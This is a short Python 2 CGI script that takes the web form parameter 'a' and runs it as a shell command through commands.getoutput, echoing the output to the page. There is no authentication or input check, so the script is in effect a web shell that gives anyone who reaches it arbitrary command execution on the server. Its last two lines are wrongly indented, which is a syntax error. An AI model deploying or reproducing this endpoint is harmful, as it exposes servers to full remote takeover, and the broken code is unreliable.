#!/usr/bin/python
import commands
import cgi

print "content-type:text/html"
print ""


data=cgi.FieldStorage() 
store=data.getvalue('a')
	print "excuting..."
	print commands.getoutput(store)
